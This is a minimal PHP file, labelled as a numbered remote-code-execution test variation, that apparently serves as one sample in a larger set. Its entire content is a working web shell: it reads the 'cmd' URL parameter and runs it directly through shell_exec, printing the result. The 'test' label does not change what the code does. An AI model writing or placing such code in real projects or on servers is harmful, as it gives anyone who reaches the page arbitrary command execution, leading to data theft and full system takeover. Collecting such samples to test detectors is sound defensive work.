<?php
// RCE test variation #1399
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>